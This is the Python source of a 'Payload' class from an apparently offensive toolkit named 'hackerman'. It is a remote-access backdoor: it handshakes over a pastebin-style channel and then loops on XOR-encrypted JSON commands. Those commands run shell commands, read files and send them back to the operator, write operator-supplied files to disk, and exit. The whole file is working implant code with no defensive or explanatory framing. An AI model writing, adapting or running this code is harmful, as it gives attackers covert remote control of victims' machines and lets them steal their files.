from hackerman.transport import ptpb
from hackerman.crypto import xor
from hackerman import utils
import json

class Payload(object):
	def __init__(self, channel, password):
		self.cli = ptpb.Client(channel)
		self.encrypt = lambda x: xor.encrypt(x, password)
		self.decrypt = lambda x: xor.decrypt(x, password)
		self.exit_trigger = False

		# handshake
		while True:
			try:
				if self.cli.recv().decode() == "ready":
					break
			except ValueError:
				pass
		self.cli.send("okay".encode())

	def do_cmd(self, cmd):
		if cmd['type'] == 'sh':
			cmd['res'] = utils.sh(cmd['cmd'])
			return cmd
		elif cmd['type'] == 'dl':
			try:
				cmd['res'] = open(cmd['fn'],'rb').read()
			except Exception as e:
				cmd['res'] = e
			return cmd
		elif cmd['type'] == 'ul':
			try:
				with open(cmd['fn'],'wb') as f:
					f.write(cmd['fd'])
				cmd['res'] = True
			except Exception as e:
				cmd['res'] = e
			return cmd
		elif cmd['type'] == 'exit':
			self.exit_trigger = True
			cmd['res'] = "ok"
			return cmd

	def run(self):
		while True:
			try:
				enc = self.cli.recv()
				dec = self.decrypt(enc)
				cmd = json.loads(dec.decode())

				res = self.do_cmd(cmd)

				txt = json.dumps(res)
				enc = self.encrypt(txt.encode())
				self.cli.send(enc)

				if self.exit_trigger:
					break
			except Exception as e:
				print(e)